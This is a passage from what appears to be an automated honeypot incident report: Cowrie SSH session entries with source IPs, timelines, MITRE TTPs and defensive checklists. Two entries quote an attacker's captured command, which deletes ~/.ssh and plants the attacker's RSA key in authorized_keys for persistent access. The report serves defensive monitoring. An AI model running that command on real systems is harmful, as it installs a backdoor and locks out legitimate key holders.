|---|---|
| **Source IP** | `176.170.1[.]244` |
| **First Seen** | 2026-07-16 07:38 |
| **Last Seen** | 2026-07-16 07:38 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:38:36` | `cowrie.session.connect` |
| `2026-07-16 07:38:38` | `cowrie.client.version` |
| `2026-07-16 07:38:38` | `cowrie.client.kex` |
| `2026-07-16 07:38:44` | `cowrie.login.success` |
| `2026-07-16 07:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.170.1[.]244` to AbuseIPDB if not already reported
- [ ] Block `176.170.1[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bd8b4974ae5

| Field | Detail |
|---|---|
| **Source IP** | `111.42.132[.]19` |
| **First Seen** | 2026-07-16 07:38 |
| **Last Seen** | 2026-07-16 07:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:38:48` | `cowrie.session.connect` |
| `2026-07-16 07:38:49` | `cowrie.client.version` |
| `2026-07-16 07:38:49` | `cowrie.client.kex` |
| `2026-07-16 07:38:51` | `cowrie.login.success` |
| `2026-07-16 07:38:52` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.42.132[.]19` to AbuseIPDB if not already reported
- [ ] Block `111.42.132[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454824cdd35b

| Field | Detail |
|---|---|
| **Source IP** | `35.195.153[.]185` |
| **First Seen** | 2026-07-16 07:42 |
| **Last Seen** | 2026-07-16 07:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:42:51` | `cowrie.session.connect` |
| `2026-07-16 07:42:51` | `cowrie.login.success` |
| `2026-07-16 07:42:52` | `cowrie.session.params` |
| `2026-07-16 07:42:52` | `cowrie.command.input` |
| `2026-07-16 07:42:52` | `cowrie.command.input` |
| `2026-07-16 07:42:52` | `cowrie.command.failed` |
| `2026-07-16 07:42:52` | `cowrie.command.input` |
| `2026-07-16 07:42:52` | `cowrie.log.closed` |
| `2026-07-16 07:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.153[.]185` to AbuseIPDB if not already reported
- [ ] Block `35.195.153[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bade4e90e7a

| Field | Detail |
|---|---|
| **Source IP** | `35.195.153[.]185` |
| **First Seen** | 2026-07-16 07:43 |
| **Last Seen** | 2026-07-16 07:43 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:43:04` | `cowrie.session.connect` |
| `2026-07-16 07:43:04` | `cowrie.login.success` |
| `2026-07-16 07:43:05` | `cowrie.session.params` |
| `2026-07-16 07:43:05` | `cowrie.command.input` |
| `2026-07-16 07:43:05` | `cowrie.command.failed` |
| `2026-07-16 07:43:16` | `cowrie.log.closed` |
| `2026-07-16 07:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.153[.]185` to AbuseIPDB if not already reported
- [ ] Block `35.195.153[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf0727a6b73

| Field | Detail |
|---|---|
| **Source IP** | `35.195.153[.]185` |
| **First Seen** | 2026-07-16 07:43 |
| **Last Seen** | 2026-07-16 07:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:43:06` | `cowrie.session.connect` |
| `2026-07-16 07:43:06` | `cowrie.login.success` |
| `2026-07-16 07:43:07` | `cowrie.session.params` |
| `2026-07-16 07:43:07` | `cowrie.command.input` |
| `2026-07-16 07:43:16` | `cowrie.log.closed` |
| `2026-07-16 07:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.153[.]185` to AbuseIPDB if not already reported
- [ ] Block `35.195.153[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf64b702eeac

| Field | Detail |
|---|---|
| **Source IP** | `103.250.160[.]76` |
| **First Seen** | 2026-07-16 07:45 |
| **Last Seen** | 2026-07-16 07:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:45:26` | `cowrie.session.connect` |
| `2026-07-16 07:45:26` | `cowrie.client.version` |
| `2026-07-16 07:45:26` | `cowrie.client.kex` |
| `2026-07-16 07:45:28` | `cowrie.login.success` |
| `2026-07-16 07:45:28` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.160[.]76` to AbuseIPDB if not already reported
- [ ] Block `103.250.160[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee827851ac91

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-16 07:46 |
| **Last Seen** | 2026-07-16 07:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:46:22` | `cowrie.session.connect` |
| `2026-07-16 07:46:22` | `cowrie.client.version` |
| `2026-07-16 07:46:22` | `cowrie.client.kex` |
| `2026-07-16 07:46:23` | `cowrie.login.success` |
| `2026-07-16 07:46:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a8fb54304b9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 07:47 |
| **Last Seen** | 2026-07-16 07:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:47:10` | `cowrie.session.connect` |
| `2026-07-16 07:47:10` | `cowrie.client.version` |
| `2026-07-16 07:47:10` | `cowrie.client.kex` |
| `2026-07-16 07:47:10` | `cowrie.login.success` |
| `2026-07-16 07:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2a04900a5c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 07:47 |
| **Last Seen** | 2026-07-16 07:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:47:10` | `cowrie.session.connect` |
| `2026-07-16 07:47:10` | `cowrie.client.version` |
| `2026-07-16 07:47:10` | `cowrie.client.kex` |
| `2026-07-16 07:47:10` | `cowrie.login.success` |
| `2026-07-16 07:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c3006e7ff62

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 07:47 |
| **Last Seen** | 2026-07-16 07:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:47:16` | `cowrie.session.connect` |
| `2026-07-16 07:47:16` | `cowrie.client.version` |
| `2026-07-16 07:47:16` | `cowrie.client.kex` |
| `2026-07-16 07:47:16` | `cowrie.login.success` |
| `2026-07-16 07:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a3bef08e176

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 07:47 |
| **Last Seen** | 2026-07-16 07:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:47:16` | `cowrie.session.connect` |
| `2026-07-16 07:47:16` | `cowrie.client.version` |
| `2026-07-16 07:47:16` | `cowrie.client.kex` |
| `2026-07-16 07:47:16` | `cowrie.login.success` |
| `2026-07-16 07:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9f6455bbf6c

| Field | Detail |
|---|---|
| **Source IP** | `175.206.1[.]60` |
| **First Seen** | 2026-07-16 07:50 |
| **Last Seen** | 2026-07-16 07:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:50:56` | `cowrie.session.connect` |
| `2026-07-16 07:50:56` | `cowrie.client.version` |
| `2026-07-16 07:50:56` | `cowrie.client.kex` |
| `2026-07-16 07:50:58` | `cowrie.login.success` |
| `2026-07-16 07:50:59` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.206.1[.]60` to AbuseIPDB if not already reported
- [ ] Block `175.206.1[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78f229b907fd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 07:59 |
| **Last Seen** | 2026-07-16 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:59:12` | `cowrie.session.connect` |
| `2026-07-16 07:59:12` | `cowrie.client.version` |
| `2026-07-16 07:59:12` | `cowrie.client.kex` |
| `2026-07-16 07:59:12` | `cowrie.login.success` |
| `2026-07-16 07:59:13` | `cowrie.session.params` |
| `2026-07-16 07:59:13` | `cowrie.command.input` |
| `2026-07-16 07:59:13` | `cowrie.log.closed` |
| `2026-07-16 07:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f52f82d8fc12

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-07-16 08:00 |
| **Last Seen** | 2026-07-16 08:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:00:04` | `cowrie.session.connect` |
| `2026-07-16 08:00:04` | `cowrie.client.version` |
| `2026-07-16 08:00:04` | `cowrie.client.kex` |
| `2026-07-16 08:00:05` | `cowrie.login.success` |
| `2026-07-16 08:00:05` | `cowrie.session.params` |
| `2026-07-16 08:00:05` | `cowrie.command.input` |
| `2026-07-16 08:00:05` | `cowrie.command.failed` |
| `2026-07-16 08:00:06` | `cowrie.log.closed` |
| `2026-07-16 08:00:07` | `cowrie.session.params` |
| `2026-07-16 08:00:07` | `cowrie.command.input` |
| `2026-07-16 08:00:07` | `cowrie.session.file_download` |
| `2026-07-16 08:00:07` | `cowrie.log.closed` |
| `2026-07-16 08:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c4fb59703c

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-07-16 08:00 |
| **Last Seen** | 2026-07-16 08:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:00:07` | `cowrie.session.connect` |
| `2026-07-16 08:00:07` | `cowrie.client.version` |
| `2026-07-16 08:00:07` | `cowrie.client.kex` |
| `2026-07-16 08:00:08` | `cowrie.login.success` |
| `2026-07-16 08:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f727520b9bdc

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-07-16 08:00 |
| **Last Seen** | 2026-07-16 08:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:00:08` | `cowrie.session.connect` |
| `2026-07-16 08:00:08` | `cowrie.client.version` |
| `2026-07-16 08:00:08` | `cowrie.client.kex` |
| `2026-07-16 08:00:09` | `cowrie.login.success` |
| `2026-07-16 08:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e9a4e811857

| Field | Detail |
|---|---|
| **Source IP** | `222.236.155[.]146` |
| **First Seen** | 2026-07-16 08:00 |
| **Last Seen** | 2026-07-16 08:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:00:22` | `cowrie.session.connect` |
| `2026-07-16 08:00:23` | `cowrie.client.version` |
| `2026-07-16 08:00:23` | `cowrie.client.kex` |
| `2026-07-16 08:00:25` | `cowrie.login.success` |
| `2026-07-16 08:00:26` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.236.155[.]146` to AbuseIPDB if not already reported
- [ ] Block `222.236.155[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efeaf7a62f92

| Field | Detail |
|---|---|
| **Source IP** | `117.50.182[.]94` |
| **First Seen** | 2026-07-16 08:03 |
| **Last Seen** | 2026-07-16 08:04 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:03:46` | `cowrie.session.connect` |
| `2026-07-16 08:03:50` | `cowrie.client.version` |
| `2026-07-16 08:03:55` | `cowrie.client.kex` |
| `2026-07-16 08:04:05` | `cowrie.login.success` |
| `2026-07-16 08:04:10` | `cowrie.session.params` |
| `2026-07-16 08:04:10` | `cowrie.command.input` |
| `2026-07-16 08:04:13` | `cowrie.log.closed` |
| `2026-07-16 08:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.182[.]94` to AbuseIPDB if not already reported
- [ ] Block `117.50.182[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec13c4e1119b

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]229` |
| **First Seen** | 2026-07-16 08:03 |
| **Last Seen** | 2026-07-16 08:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:03:51` | `cowrie.session.connect` |
| `2026-07-16 08:03:53` | `cowrie.client.version` |
| `2026-07-16 08:03:53` | `cowrie.client.kex` |
| `2026-07-16 08:03:54` | `cowrie.login.success` |
| `2026-07-16 08:03:55` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]229` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8b696831f32

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-07-16 08:04 |
| **Last Seen** | 2026-07-16 08:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:04:05` | `cowrie.session.connect` |
| `2026-07-16 08:04:06` | `cowrie.client.version` |
| `2026-07-16 08:04:06` | `cowrie.client.kex` |
| `2026-07-16 08:04:09` | `cowrie.login.success` |
| `2026-07-16 08:04:10` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b421a6c3d40

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-07-16 08:04 |
| **Last Seen** | 2026-07-16 08:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:04:54` | `cowrie.session.connect` |
| `2026-07-16 08:04:54` | `cowrie.client.version` |
| `2026-07-16 08:04:54` | `cowrie.client.kex` |
| `2026-07-16 08:04:55` | `cowrie.login.success` |
| `2026-07-16 08:04:55` | `cowrie.session.params` |
| `2026-07-16 08:04:55` | `cowrie.command.input` |
| `2026-07-16 08:04:55` | `cowrie.command.failed` |
| `2026-07-16 08:04:56` | `cowrie.log.closed` |
| `2026-07-16 08:04:57` | `cowrie.session.params` |
| `2026-07-16 08:04:57` | `cowrie.command.input` |
| `2026-07-16 08:04:57` | `cowrie.session.file_download` |
| `2026-07-16 08:04:57` | `cowrie.log.closed` |
| `2026-07-16 08:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd51b02e60e7

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-07-16 08:04 |
| **Last Seen** | 2026-07-16 08:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:04:57` | `cowrie.session.connect` |
| `2026-07-16 08:04:57` | `cowrie.client.version` |
| `2026-07-16 08:04:57` | `cowrie.client.kex` |
| `2026-07-16 08:04:58` | `cowrie.login.success` |
| `2026-07-16 08:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f268796d380e

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-07-16 08:04 |
| **Last Seen** | 2026-07-16 08:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:04:58` | `cowrie.session.connect` |
| `2026-07-16 08:04:58` | `cowrie.client.version` |
| `2026-07-16 08:04:58` | `cowrie.client.kex` |
| `2026-07-16 08:04:58` | `cowrie.login.success` |
| `2026-07-16 08:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f789bdd80cbd

| Field | Detail |
|---|---|
| **Source IP** | `103.251.143[.]14` |
| **First Seen** | 2026-07-16 08:07 |
| **Last Seen** | 2026-07-16 08:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:07:08` | `cowrie.session.connect` |
| `2026-07-16 08:07:08` | `cowrie.client.version` |
| `2026-07-16 08:07:08` | `cowrie.client.kex` |
| `2026-07-16 08:07:10` | `cowrie.login.success` |
| `2026-07-16 08:07:11` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.251.143[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.251.143[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10de001783d7

| Field | Detail |
|---|---|
| **Source IP** | `103.83.23[.]169` |
| **First Seen** | 2026-07-16 08:07 |
| **Last Seen** | 2026-07-16 08:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:07:21` | `cowrie.session.connect` |
| `2026-07-16 08:07:21` | `cowrie.client.version` |
| `2026-07-16 08:07:21` | `cowrie.client.kex` |
| `2026-07-16 08:07:23` | `cowrie.login.success` |
| `2026-07-16 08:07:24` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.83.23[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.83.23[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-557b4d8364b4

| Field | Detail |
|---|---|
| **Source IP** | `60.220.241[.]50` |
| **First Seen** | 2026-07-16 08:10 |
| **Last Seen** | 2026-07-16 08:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:10:42` | `cowrie.session.connect` |
| `2026-07-16 08:10:42` | `cowrie.client.version` |
| `2026-07-16 08:10:42` | `cowrie.client.kex` |
